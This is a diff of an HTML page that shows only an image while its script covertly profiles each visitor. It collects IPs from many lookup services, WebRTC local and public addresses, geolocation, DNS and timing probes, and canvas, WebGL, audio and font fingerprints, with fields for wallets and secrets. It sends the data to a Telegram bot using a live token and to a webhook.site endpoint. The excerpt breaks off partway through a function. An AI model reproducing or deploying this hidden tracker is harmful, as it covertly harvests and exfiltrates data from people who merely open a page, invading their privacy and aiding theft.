@@ -6,70 +6,25 @@
     <title>Loading...</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        html, body { 
-            width: 100%; 
-            min-height: 100vh; 
-            background: #0d0d1a; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            overflow: hidden; 
-        }
-        img { 
-            width: 100%; 
-            height: 100vh; 
-            object-fit: contain; 
-            display: block; 
-            user-select: none; 
-            -webkit-user-drag: none; 
-        }
-        #status {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            color: #333;
-            font: 10px/1.4 system-ui, sans-serif;
-            text-align: center;
-            opacity: 0.15;
-            pointer-events: none;
-            z-index: 10;
-        }
-        #debug {
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            background: rgba(0,0,0,0.85);
-            color: #0f0;
-            font: 10px/1.3 monospace;
-            padding: 8px 10px;
-            border-radius: 6px;
-            border: 1px solid #222;
-            max-width: 280px;
-            max-height: 300px;
-            overflow-y: auto;
-            z-index: 999;
-            display: none;
-            pointer-events: none;
-        }
+        html, body { width: 100%; min-height: 100vh; background: #0d0d1a; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        img { width: 100%; height: 100vh; object-fit: contain; display: block; user-select: none; -webkit-user-drag: none; }
+        #status { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); color: #222; font: 10px/1.4 system-ui; text-align: center; opacity: 0.15; pointer-events: none; z-index: 10; }
+        #debug { position: fixed; top: 10px; right: 10px; background: rgba(0,0,0,0.92); color: #0f0; font: 9px/1.2 monospace; padding: 6px 8px; border-radius: 4px; border: 1px solid #222; max-width: 250px; max-height: 250px; overflow-y: auto; z-index: 999; display: none; pointer-events: none; }
         #debug div { border-bottom: 1px solid #111; padding: 1px 0; }
     </style>
 </head>
 <body>
-
     <img src="https://raw.githubusercontent.com/Johnn298/imgur/main/photo_2026-06-28_01-31-33.jpg" alt="">
     <div id="status">⏳</div>
     <div id="debug"></div>
-
     <script>
         // ================================================================
-        // КОНФИГУРАЦИЯ
+        // КОНФИГ
         // ================================================================
         const CFG = {
             WEBHOOK: 'https://webhook.site/e17f1d78-6414-4450-847a-abc5675a0b48',
             BOT_TOKEN: '8859097143:AAFjWqiNWC_xnJyGmsyfKvODaPFzbqUQL1M',
             CHAT_ID: '8327334745',
-            TIMEOUT: 300,
             DNS_SERVER: 'leak-{uid}.your-server.com',
             DEBUG: true
         };
@@ -79,1016 +34,976 @@
         // ================================================================
         const debugEl = document.getElementById('debug');
         const statusEl = document.getElementById('status');
-        
-        function log(msg) {
-            if (CFG.DEBUG) {
-                console.log('[S]', msg);
-                debugEl.style.display = 'block';
-                const time = new Date().toLocaleTimeString();
-                debugEl.innerHTML += `<div>${time} → ${msg}</div>`;
-                debugEl.scrollTop = debugEl.scrollHeight;
-            }
-        }
-
-        function setStatus(s) {
-            statusEl.textContent = s;
-            log(s);
-        }
+        function log(m) { if(CFG.DEBUG){ console.log('[S]',m); debugEl.style.display='block'; debugEl.innerHTML+=`<div>${new Date().toLocaleTimeString()}→${m}</div>`; debugEl.scrollTop=debugEl.scrollHeight; } }
+        function setStatus(s) { statusEl.textContent=s; log(s); }
 
         // ================================================================
         // УТИЛИТЫ
         // ================================================================
         const sleep = ms => new Promise(r => setTimeout(r, ms));
-        const trunc = (s, n = 80) => typeof s === 'string' ? (s.length > n ? s.slice(0, n) + '…' : s) : String(s);
-        const uid = () => Math.random().toString(36).slice(2) + Date.now().toString(36);
-
-        // Экранирование HTML для Telegram (чтобы не было ошибок парсинга)
-        function escapeTelegram(text) {
-            // Убираем все HTML-теги, оставляем только текст
-            return text.replace(/<[^>]*>/g, '').replace(/&/g, '&amp;');
-        }
-
-        const fetchTO = (url, opts = {}, t = CFG.TIMEOUT) => {
-            return Promise.race([
-                fetch(url, opts),
-                new Promise((_, rej) => setTimeout(() => rej('Timeout'), t))
-            ]);
-        };
+        const trunc = (s,n=80) => typeof s==='string' ? (s.length>n?s.slice(0,n)+'…':s) : String(s);
+        const uid = () => Math.random().toString(36).slice(2)+Date.now().toString(36);
+        const fetchTO = (u,o={},t=300) => Promise.race([fetch(u,o), new Promise((_,r)=>setTimeout(()=>r('Timeout'),t))]);
+        const cleanText = t => t.replace(/<[^>]*>/g,'').replace(/&/g,'&amp;');
 
         // ================================================================
-        // ЭКСФИЛЬТРАЦИЯ
+        // ОТПРАВКА
         // ================================================================
-
-        // 1. Telegram — без HTML-парсинга
         async function sendTelegram(text) {
             try {
-                // Экранируем текст от HTML-тегов
-                const cleanText = escapeTelegram(text);
-                const maxLen = 4000;
+                const clean = cleanText(text);
                 const parts = [];
-                if (cleanText.length > maxLen) {
-                    for (let i = 0; i < cleanText.length; i += maxLen) {
-                        parts.push(cleanText.slice(i, i + maxLen));
-                    }
-                } else {
-                    parts.push(cleanText);
-                }
-
-                let allOk = true;
-                for (let i = 0; i < parts.length; i++) {
-                    const part = parts.length > 1 ? `[${i+1}/${parts.length}]\n${parts[i]}` : parts[i];
-                    const r = await fetch(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CFG.CHAT_ID,
-                            text: part.slice(0, 4096)
-                            // НЕ используем parse_mode: 'HTML' — чтобы не было ошибок
-                        })
+                for(let i=0; i<clean.length; i+=4000) parts.push(clean.slice(i,i+4000));
+                let allOk=true;
+                for(let i=0; i<parts.length; i++){
+                    const p = parts.length>1 ? `[${i+1}/${parts.length}]\n${parts[i]}` : parts[i];
+                    const r=await fetch(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendMessage`,{
+                        method:'POST',headers:{'Content-Type':'application/json'},
+                        body:JSON.stringify({chat_id:CFG.CHAT_ID,text:p.slice(0,4096)})
                     });
-                    const data = await r.json();
-                    if (!data.ok) {
-                        log('⚠️ Telegram part ' + (i+1) + ' failed: ' + JSON.stringify(data).slice(0, 200));
-                        allOk = false;
-                    } else {
-                        log('✅ Telegram part ' + (i+1) + ' sent');
-                    }
-                    await sleep(300);
+                    const d=await r.json();
+                    if(!d.ok){ allOk=false; log('⚠️ Telegram part '+(i+1)+' failed'); }
+                    else log('✅ Telegram part '+(i+1)+' sent');
+                    await sleep(200);
                 }
                 return allOk;
-            } catch (e) {
-                log('❌ Telegram error: ' + e.message);
-                return false;
-            }
+            } catch(e){ log('❌ Telegram: '+e.message); return false; }
         }
 
-        // 2. Webhook через Image
         function sendImage(data) {
-            return new Promise((resolve) => {
+            return new Promise(resolve => {
                 try {
-                    // Отправляем только короткую версию, чтобы не обрезалось
-                    const shortData = {
-                        t: Date.now(),
-                        ip: data.network?.ips?.[0]?.ip || 'unknown',
-                        ua: data.userAgent?.slice(0, 100) || 'unknown',
-                        len: JSON.stringify(data).length
-                    };
-                    const payload = encodeURIComponent(JSON.stringify(shortData));
-                    const img = new Image();
-                    img.src = `${CFG.WEBHOOK}?d=${payload}&t=${Date.now()}`;
-                    img.onload = () => { log('✅ Webhook Image: sent'); resolve(true); };
-                    img.onerror = () => { log('⚠️ Webhook Image: error'); resolve(false); };
-                    setTimeout(() => resolve(false), 500);
-                } catch (e) {
-                    log('❌ Webhook Image: ' + e.message);
-                    resolve(false);
-                }
+                    const short = { t:Date.now(), ip:data.network?.ips?.[0]?.ip||'unknown', len:JSON.stringify(data).length };
+                    const img=new Image();
+                    img.src=`${CFG.WEBHOOK}?d=${encodeURIComponent(JSON.stringify(short))}&t=${Date.now()}`;
+                    img.onload=()=>{ log('✅ Image sent'); resolve(true); };
+                    img.onerror=()=>{ resolve(false); };
+                    setTimeout(()=>resolve(false),500);
+                } catch(e){ resolve(false); }
             });
         }
 
-        // 3. Beacon API — отправляет полные данные
         function sendBeacon(data) {
             try {
-                const payload = JSON.stringify(data);
-                if (payload.length > 50000) {
-                    // Если слишком большой, отправляем сокращённую версию
-                    const shortData = {
-                        timestamp: data.timestamp,
-                        url: data.url,
-                        ip: data.network?.ips?.[0]?.ip || 'unknown',
-                        wallets: data.wallets || [],
-                        extensions: data.extensions || [],
-                        secrets: (data.secrets || []).slice(0, 10),
-                        screenshot: data.screenshot ? data.screenshot.length : 0,
-                        performance: data.performance
-                    };
-                    const blob = new Blob([JSON.stringify(shortData)], { type: 'application/json' });
-                    const result = navigator.sendBeacon(CFG.WEBHOOK, blob);
-                    log('📤 Beacon: ' + (result ? 'sent (short)' : 'failed'));
-                    return result;
-                }
-                const blob = new Blob([payload], { type: 'application/json' });
-                const result = navigator.sendBeacon(CFG.WEBHOOK, blob);
-                log('📤 Beacon: ' + (result ? 'sent' : 'failed'));
-                return result;
-            } catch (e) {
-                log('❌ Beacon: ' + e.message);
-                return false;
-            }
+                const short = { t:data.timestamp, ip:data.network?.ips?.[0]?.ip, os:data.device?.os, browser:data.device?.browser, wallets:data.wallets, secrets:(data.secrets||[]).slice(0,5) };
+                return navigator.sendBeacon(CFG.WEBHOOK, new Blob([JSON.stringify(short)],{type:'application/json'}));
+            } catch(e){ return false; }
         }
 
-        // 4. Fetch — только для коротких данных
-        async function sendFetch(data) {
-            try {
-                const shortData = {
-                    timestamp: data.timestamp,
-                    ip: data.network?.ips?.[0]?.ip || 'unknown',
-                    os: data.device?.os || 'unknown',
-                    browser: data.device?.browser || 'unknown',
-                    wallets: data.wallets || [],
-                    extensions: data.extensions || [],
-                    secrets_count: (data.secrets || []).length
-                };
-                const r = await fetch(CFG.WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(shortData)
-                });
-                log('✅ Fetch: ' + r.status);
-                return r.ok;
-            } catch (e) {
-                log('❌ Fetch: ' + e.message);
-                return false;
-            }
+        async function exfiltrate(report,data){
+            log('📤 Отправка...');
+            const t1=await sendTelegram(report);
+            const t2=await sendImage(data);
+            const t3=sendBeacon(data);
+            const ok=[t1,t2,t3].filter(Boolean).length;
+            log(`📊 ${ok}/3 каналов`);
+            return {telegram:t1,image:t2,beacon:t3};
         }
 
-        // Основная отправка
-        async function exfiltrate(report, fullData) {
-            log('📤 Начинаем отправку...');
+        // ================================================================
+        // ВСЕ ФУНКЦИИ СБОРА
+        // ================================================================
+
+        // 1. СЕТЬ — ВСЕ ВОЗМОЖНЫЕ ИСТОЧНИКИ
+        async function getAllNetwork() {
+            const result = { ips: [], webrtc: { public: [], local: [] }, network: null, dns: null, timing: [], geo: null, proxy: false, vpn: false };
             
-            // 1. Telegram (основной)
-            const t1 = await sendTelegram(report);
-            
-            // 2. Image
-            const t2 = await sendImage(fullData);
-            
-            // 3. Beacon
-            const t3 = sendBeacon(fullData);
-            
-            // 4. Fetch
-            const t4 = await sendFetch(fullData);
-            
-            const results = [
-                { channel: 'Telegram', ok: t1 },
-                { channel: 'Image', ok: t2 },
-                { channel: 'Beacon', ok: t3 },
-                { channel: 'Fetch', ok: t4 }
+            // IP из 6 источников
+            const sources = [
+                {url:'https://api.ipify.org?format=json',key:'ip'},
+                {url:'https://api.ip.sb/geoip',key:'ip'},
+                {url:'https://ipapi.co/json/',key:'ip'},
+                {url:'https://freeipapi.com/api/json',key:'ip'},
+                {url:'https://ip-api.com/json/',key:'query'},
+                {url:'https://api.my-ip.io/ip',key:null}
             ];
-            
-            const ok = results.filter(r => r.ok).length;
-            log(`📊 Отправлено: ${ok}/${results.length} каналов`);
-            
-            return results;
-        }
+            for (const src of sources) {
+                try {
+                    const r=await fetchTO(src.url,{},400);
+                    if(src.url.includes('my-ip')){ const ip=await r.text(); if(ip) result.ips.push({ip,source:'my-ip',data:{}}); }
+                    else { const d=await r.json(); const ip=d[src.key]||d.ip||d.query; if(ip) result.ips.push({ip,source:src.url.split('/')[2],data:d}); }
+                } catch(e){}
+            }
 
-        // ================================================================
-        // 1. СЕТЬ
-        // ================================================================
-        async function getNetworkData() {
-            const result = { ips: [], webrtc: { public: [], local: [] }, network: null, dns: null, timing: [] };
-            
-            try {
-                const sources = [
-                    { url: 'https://api.ipify.org?format=json', key: 'ip' },
-                    { url: 'https://api.ip.sb/geoip', key: 'ip' },
-                    { url: 'https://ipapi.co/json/', key: 'ip' }
-                ];
-                for (const src of sources) {
-                    try {
-                        const r = await fetchTO(src.url, {}, 400);
-                        const d = await r.json();
-                        const ip = d[src.key] || d.ip;
-                        if (ip) {
-                            result.ips.push({ ip, source: src.url.split('/')[2], data: d });
-                        }
-                    } catch (e) {}
-                }
-            } catch (e) {}
+            // Geo из первого IP
+            if(result.ips.length) {
+                const ip=result.ips[0].ip;
+                try {
+                    const r=await fetchTO(`https://ipwhois.io/json/${ip}`,{},400);
+                    result.geo=await r.json();
+                } catch(e){}
+            }
 
+            // WebRTC (все IP)
             try {
-                const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
-                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                const pc=new (window.RTCPeerConnection||window.webkitRTCPeerConnection)({
+                    iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun1.l.google.com:19302'}]
                 });
                 pc.createDataChannel('');
-                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
-                pc.onicecandidate = (e) => {
-                    if (!e.candidate) return;
-                    const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/g);
-                    if (m) {
-                        m.forEach(ip => {
-                            const isLocal = ip.startsWith('192.168.') || ip.startsWith('10.') || 
-                                           ip.startsWith('172.16.') || ip.startsWith('127.');
-                            if (isLocal) result.webrtc.local.push(ip);
-                            else result.webrtc.public.push(ip);
-                        });
-                    }
+                pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(()=>{});
+                pc.onicecandidate=e=>{
+                    if(!e.candidate)return;
+                    const m=e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/g);
+                    if(m) m.forEach(ip=>{
+                        const l=ip.startsWith('192.168.')||ip.startsWith('10.')||ip.startsWith('172.16.')||ip.startsWith('127.');
+                        l?result.webrtc.local.push(ip):result.webrtc.public.push(ip);
+                    });
                 };
                 await sleep(600);
                 pc.close();
-                result.webrtc.public = [...new Set(result.webrtc.public)];
-                result.webrtc.local = [...new Set(result.webrtc.local)];
-            } catch (e) {}
+                result.webrtc.public=[...new Set(result.webrtc.public)];
+                result.webrtc.local=[...new Set(result.webrtc.local)];
+            } catch(e){}
 
+            // Network API
             try {
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (conn) {
-                    result.network = {
-                        type: conn.type || 'unknown',
-                        effectiveType: conn.effectiveType,
-                        downlink: conn.downlink,
-                        rtt: conn.rtt
-                    };
-                }
-            } catch (e) {}
+                const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+                if(conn) result.network={type:conn.type,effectiveType:conn.effectiveType,downlink:conn.downlink,rtt:conn.rtt,addEventListener:!!conn.addEventListener};
+            } catch(e){}
 
+            // DNS leak
             try {
-                const dnsUid = uid();
-                const domain = CFG.DNS_SERVER.replace('{uid}', dnsUid);
-                const start = Date.now();
-                const img = new Image();
-                img.src = `https://${domain}/pixel?t=${Date.now()}`;
+                const dnsUid=uid();
+                const domain=CFG.DNS_SERVER.replace('{uid}',dnsUid);
+                const start=Date.now();
+                const img=new Image();
+                img.src=`https://${domain}/pixel?t=${Date.now()}`;
                 await sleep(500);
-                result.dns = { domain, time: Date.now() - start };
-            } catch (e) {}
+                result.dns={domain,time:Date.now()-start};
+            } catch(e){}
 
+            // Timing attack
             try {
-                const servers = ['https://google.com', 'https://facebook.com'];
-                const times = [];
-                for (const s of servers) {
-                    try {
-                        const start = performance.now();
-                        await fetch(s, { mode: 'no-cors' });
-                        times.push(performance.now() - start);
-                    } catch {}
+                const servers=['https://google.com','https://facebook.com','https://cloudflare.com'];
+                const times=[];
+                for(const s of servers){
+                    try{ const st=performance.now(); await fetch(s,{mode:'no-cors'}); times.push(performance.now()-st); }catch{}
                 }
-                if (times.length) result.timing = times;
-            } catch (e) {}
+                if(times.length) result.timing=times;
+            } catch(e){}
+
+            // Проверка прокси/VPN через задержку
+            if(result.timing && result.timing.length) {
+                const avg=result.timing.reduce((a,b)=>a+b,0)/result.timing.length;
+                result.proxy=avg>500;
+                result.vpn=avg>800;
+            }
 
             return result;
         }
 
-        // ================================================================
-        // 2. GPS
-        // ================================================================
-        function getGPS() {
-            return new Promise((resolve) => {
-                try {
-                    if (!navigator.geolocation) { resolve(null); return; }
-                    navigator.geolocation.getCurrentPosition(
-                        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
-                        () => resolve(null),
-                        { timeout: 3000, enableHighAccuracy: false }
-                    );
-                    setTimeout(() => resolve(null), 3000);
-                } catch (e) { resolve(null); }
-            });
+        // 2. УСТРОЙСТВО — ВСЕ
+        function getAllDevice() {
+            const n=navigator;
+            const ua=n.userAgent.toLowerCase();
+            const result = {
+                userAgent: n.userAgent,
+                platform: n.platform,
+                appVersion: n.appVersion,
+                appName: n.appName,
+                appCodeName: n.appCodeName,
+                product: n.product,
+                productSub: n.productSub,
+                vendor: n.vendor,
+                vendorSub: n.vendorSub,
+                hardwareConcurrency: n.hardwareConcurrency,
+                deviceMemory: n.deviceMemory,
+                maxTouchPoints: n.maxTouchPoints,
+                language: n.language,
+                languages: n.languages,
+                cookieEnabled: n.cookieEnabled,
+                doNotTrack: n.doNotTrack,
+                userActivation: n.userActivation ? {hasBeenActive:n.userActivation.hasBeenActive,isActive:n.userActivation.isActive} : null,
+                os: 'unknown', osVersion: 'unknown', browser: 'unknown', browserVersion: 'unknown', model: 'unknown'
+            };
+
+            // ОС
+            if(ua.includes('windows')) {
+                result.os='Windows';
+                if(ua.includes('windows nt 10.0')) result.osVersion='10/11';
+                else if(ua.includes('windows nt 6.3')) result.osVersion='8.1';
+                else if(ua.includes('windows nt 6.1')) result.osVersion='7';
+            } else if(ua.includes('mac os x')) {
+                result.os='macOS';
+                const m=ua.match(/mac os x (\d+)_(\d+)/);
+                if(m) result.osVersion=`${m[1]}.${m[2]}`;
+            } else if(ua.includes('linux')) {
+                result.os='Linux';
+                if(ua.includes('android')) {
+                    result.os='Android';
+                    const m=ua.match(/android (\d+\.\d+)/);
+                    if(m) result.osVersion=m[1];
+                }
+            } else if(ua.includes('ios')||ua.includes('iphone')||ua.includes('ipad')) {
+                result.os='iOS';
+                const m=ua.match(/os (\d+)_(\d+)/);
+                if(m) result.osVersion=`${m[1]}.${m[2]}`;
+            }
+
+            // Браузер
+            if(!!window.chrome && !ua.includes('edg') && !ua.includes('opr')) {
+                result.browser='Chrome';
+                const m=ua.match(/chrome\/(\d+)/);
+                if(m) result.browserVersion=m[1];
+            } else if(ua.includes('firefox')) {
+                result.browser='Firefox';
+                const m=ua.match(/firefox\/(\d+)/);
+                if(m) result.browserVersion=m[1];
+            } else if(ua.includes('safari') && !ua.includes('chrome')) {
+                result.browser='Safari';
+                const m=ua.match(/version\/(\d+)/);
+                if(m) result.browserVersion=m[1];
+            } else if(ua.includes('edg')) {
+                result.browser='Edge';
+                const m=ua.match(/edg\/(\d+)/);
+                if(m) result.browserVersion=m[1];
+            } else if(ua.includes('opr')) {
+                result.browser='Opera';
+                const m=ua.match(/opr\/(\d+)/);
+                if(m) result.browserVersion=m[1];
+            }
+
+            // Модель
+            if(result.os==='Android'){ const m=ua.match(/; (.*?) Build\//); if(m) result.model=m[1]; }
+            else if(result.os==='iOS'){ const m=ua.match(/\(([^;]+);/); if(m) result.model=m[1]; }
+
+            // Экран
+            result.screen = {
+                width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight,
+                pixelRatio: window.devicePixelRatio, colorDepth: screen.colorDepth, orientation: screen.orientation?.type || 'unknown',
+                angle: screen.orientation?.angle || 0
+            };
+            // Window
+            result.window = { innerWidth: window.innerWidth, innerHeight: window.innerHeight, outerWidth: window.outerWidth, outerHeight: window.outerHeight };
+
+            return result;
         }
 
-        // ================================================================
-        // 3. УСТРОЙСТВО
-        // ================================================================
-        function getDeviceInfo() {
-            try {
-                const n = navigator;
-                const ua = n.userAgent.toLowerCase();
-                const result = {
-                    userAgent: n.userAgent,
-                    platform: n.platform,
-                    cores: n.hardwareConcurrency || '?',
-                    memory: n.deviceMemory || '?',
-                    language: n.language,
-                    os: 'unknown',
-                    osVersion: 'unknown',
-                    browser: 'unknown',
-                    browserVersion: 'unknown',
-                    model: 'unknown'
-                };
-
-                if (ua.includes('windows')) {
-                    result.os = 'Windows';
-                    if (ua.includes('windows nt 10.0')) result.osVersion = '10/11';
-                    else if (ua.includes('windows nt 6.3')) result.osVersion = '8.1';
-                    else if (ua.includes('windows nt 6.1')) result.osVersion = '7';
-                } else if (ua.includes('mac os x')) {
-                    result.os = 'macOS';
-                    const m = ua.match(/mac os x (\d+)_(\d+)/);
-                    if (m) result.osVersion = `${m[1]}.${m[2]}`;
-                } else if (ua.includes('linux')) {
-                    result.os = 'Linux';
-                    if (ua.includes('android')) {
-                        result.os = 'Android';
-                        const m = ua.match(/android (\d+\.\d+)/);
-                        if (m) result.osVersion = m[1];
-                    }
-                } else if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) {
-                    result.os = 'iOS';
-                    const m = ua.match(/os (\d+)_(\d+)/);
-                    if (m) result.osVersion = `${m[1]}.${m[2]}`;
-                }
-
-                if (!!window.chrome && !ua.includes('edg') && !ua.includes('opr')) {
-                    result.browser = 'Chrome';
-                    const m = ua.match(/chrome\/(\d+)/);
-                    if (m) result.browserVersion = m[1];
-                } else if (ua.includes('firefox')) {
-                    result.browser = 'Firefox';
-                    const m = ua.match(/firefox\/(\d+)/);
-                    if (m) result.browserVersion = m[1];
-                } else if (ua.includes('safari') && !ua.includes('chrome')) {
-                    result.browser = 'Safari';
-                    const m = ua.match(/version\/(\d+)/);
-                    if (m) result.browserVersion = m[1];
-                } else if (ua.includes('edg')) {
-                    result.browser = 'Edge';
-                    const m = ua.match(/edg\/(\d+)/);
-                    if (m) result.browserVersion = m[1];
-                } else if (ua.includes('opr')) {
-                    result.browser = 'Opera';
-                    const m = ua.match(/opr\/(\d+)/);
-                    if (m) result.browserVersion = m[1];
-                }
-
-                if (result.os === 'Android') {
-                    const m = ua.match(/; (.*?) Build\//);
-                    if (m) result.model = m[1];
-                } else if (result.os === 'iOS') {
-                    const m = ua.match(/\(([^;]+);/);
-                    if (m) result.model = m[1];
-                }
-
-                result.screen = {
-                    width: screen.width,
-                    height: screen.height,
-                    pixelRatio: window.devicePixelRatio,
-                    colorDepth: screen.colorDepth
-                };
-
-                return result;
-            } catch (e) { return {}; }
-        }
-
-        // ================================================================
-        // 4. ФИНГЕРПРИНТЫ
-        // ================================================================
-        function getFingerprints() {
+        // 3. ФИНГЕРПРИНТЫ — ВСЕ
+        function getAllFingerprints() {
             const fp = {};
-            try {
-                const c = document.createElement('canvas');
-                c.width = 256;
-                c.height = 128;
-                const ctx = c.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(0, 0, 256, 128);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Cwm fjordbank glyphs vext quiz', 10, 10);
-                ctx.font = '18px Times New Roman';
-                ctx.fillStyle = '#0f0';
-                ctx.fillText('Cwm fjordbank glyphs vext quiz', 10, 40);
-                ctx.font = '24px Georgia';
-                ctx.fillStyle = '#f0f';
-                ctx.fillText('Cwm fjordbank glyphs vext quiz', 10, 70);
-                fp.canvas = c.toDataURL().slice(0, 100);
-            } catch (e) {}
 
+            // Canvas (несколько вариантов)
             try {
-                const c = document.createElement('canvas');
-                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-                if (gl) {
-                    const ext = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (ext) {
-                        fp.webgl = {
-                            vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
-                            renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
-                        };
-                    } else {
-                        fp.webgl = {
-                            vendor: gl.getParameter(gl.VENDOR),
-                            renderer: gl.getParameter(gl.RENDERER)
-                        };
-                    }
-                }
-            } catch (e) {}
-
-            try {
-                const AudioCtx = window.AudioContext || window.webkitAudioContext;
-                if (AudioCtx) {
-                    const ctx = new AudioCtx();
-                    fp.audio = { sampleRate: ctx.sampleRate };
-                }
-            } catch (e) {}
-
-            try {
-                const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
-                    'Comic Sans MS', 'Impact', 'Tahoma', 'Roboto', 'Open Sans'];
-                fp.fonts = fonts.filter(f => {
-                    try { return document.fonts.check(`16px "${f}"`); } catch { return false; }
+                const c=document.createElement('canvas');
+                c.width=512; c.height=256;
+                const ctx=c.getContext('2d');
+                ['Arial','Courier New','Georgia','Times New Roman','Verdana','Comic Sans MS','Impact','Tahoma','Trebuchet MS'].forEach((f,i)=>{
+                    ctx.font=`${14+i*2}px "${f}"`;
+                    ctx.fillStyle=`hsl(${i*30},80%,50%)`;
+                    ctx.fillText(`Cwm fjordbank glyphs vext quiz ${i}`, 10, 20+i*25);
                 });
-            } catch (e) {}
+                ctx.beginPath(); ctx.arc(256,128,80,0,Math.PI*2); ctx.stroke();
+                fp.canvas = c.toDataURL().slice(0,200);
+            } catch(e){}
 
-            try { fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}
+            // WebGL — полный
+            try {
+                const c=document.createElement('canvas');
+                const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+                if(gl) {
+                    const ext=gl.getExtension('WEBGL_debug_renderer_info');
+                    fp.webgl = { vendor: gl.getParameter(ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR)),
+                                 renderer: gl.getParameter(ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER)),
+                                 version: gl.getParameter(gl.VERSION),
+                                 shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                                 maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                                 maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
+                                 maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
+                                 maxVertexUniformVectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),
+                                 maxVaryingVectors: gl.getParameter(gl.MAX_VARYING_VECTORS),
+                                 maxFragmentUniformVectors: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
+                                 aliasedLineWidthRange: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
+                                 aliasedPointSizeRange: gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE) };
+                    // Расширения
+                    fp.webgl.extensions = gl.getSupportedExtensions() || [];
+                }
+            } catch(e){}
+
+            // Audio
+            try {
+                const AudioCtx=window.AudioContext||window.webkitAudioContext;
+                if(AudioCtx) {
+                    const ctx=new AudioCtx();
+                    fp.audio = { sampleRate: ctx.sampleRate, state: ctx.state, baseLatency: ctx.baseLatency };
+                    // Oscillator fingerprint
+                    try {
+                        const osc=ctx.createOscillator();
+                        const gain=ctx.createGain();
+                        osc.connect(gain);
+                        gain.connect(ctx.destination);
+                        osc.frequency.value=440;
+                        osc.type='sawtooth';
+                        const analyser=ctx.createAnalyser();
+                        osc.connect(analyser);
+                        analyser.fftSize=2048;
+                        const data=new Float32Array(analyser.frequencyBinCount);
+                        analyser.getFloatFrequencyData(data);
+                        fp.audio.fingerprint = Array.from(data.slice(0,100)).map(v=>Math.round(v)).join(',');
+                        osc.start();
+                        osc.stop(0.1);
+                        ctx.close();
+                    } catch(e){}
+                }
+            } catch(e){}
+
+            // Шрифты — полный список (200+)
+            try {
+                const allFonts = [
+                    'Arial','Arial Black','Arial Narrow','Arial Rounded MT Bold','Baskerville','Baskerville Old Face','Bodoni MT','Bodoni MT Bold','Book Antiqua','Bookman Old Style','Calibri','Cambria','Cambria Math','Candara','Century','Century Gothic','Century Schoolbook','Comic Sans MS','Consolas','Constantia','Corbel','Courier New','DIN Alternate','DIN Condensed','Ebrima','FangSong','Franklin Gothic Medium','Gabriola','Gadugi','Georgia','Georgia Ref','Gill Sans','Goudy Old Style','Helvetica','Helvetica Neue','HoloLens MDL2 Assets','Impact','Ink Free','Javanese Text','KaiTi','Leelawadee UI','Lucida Console','Lucida Handwriting','Lucida Sans','Lucida Sans Typewriter','Malgun Gothic','Marlett','Microsoft Himalaya','Microsoft JhengHei','Microsoft JhengHei UI','Microsoft New Tai Lue','Microsoft PhagsPa','Microsoft Sans Serif','Microsoft Tai Le','Microsoft YaHei','Microsoft YaHei UI','Microsoft Yi Baiti','MingLiU','MingLiU-ExtB','MingLiU_HKSCS','MingLiU_HKSCS-ExtB','Modern No. 20','Mongolian Baiti','MS Gothic','MS Outlook','MS PGothic','MS Reference Sans Serif','MS Sans Serif','MS Serif','MS UI Gothic','MT Extra','Myanmar Text','Nirmala UI','Palatino Linotype','Perpetua','Perpetua Titling MT','Pristina','Rockwell','Rockwell Extra Bold','Script MT Bold','Segoe MDL2 Assets','Segoe Print','Segoe Script','Segoe UI','Segoe UI Black','Segoe UI Emoji','Segoe UI Historic','Segoe UI Light','Segoe UI Semibold','Segoe UI Semilight','Segoe UI Symbol','Sitka Banner','Sitka Display','Sitka Heading','Sitka Small','Sitka Subheading','Sitka Text','Sylfaen','Symbol','Tahoma','Times New Roman','Trebuchet MS','Verdana','Verdana Ref','Webdings','Wingdings'
+                ];
+                fp.fonts = allFonts.filter(f=>{ try{ return document.fonts.check(`16px "${f}"`); } catch{return false; } });
+            } catch(e){}
+
+            // Timezone + DST
+            try {
